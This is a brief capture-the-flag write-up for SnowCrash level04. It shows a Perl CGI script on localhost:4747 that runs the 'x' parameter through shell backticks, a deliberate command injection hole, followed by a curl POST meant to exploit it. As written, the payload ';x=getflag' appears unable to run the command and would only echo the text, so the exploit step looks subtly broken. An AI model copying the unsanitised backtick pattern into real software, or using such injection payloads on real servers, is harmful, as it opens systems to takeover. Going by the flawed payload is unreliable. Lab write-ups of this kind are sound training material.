# level04

HTTP post requests, and a vulnerable Perl CGI script

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

```bash
level04@SnowCrash:~ $ curl -d ';x=getflag' -X POST localhost:4747
```
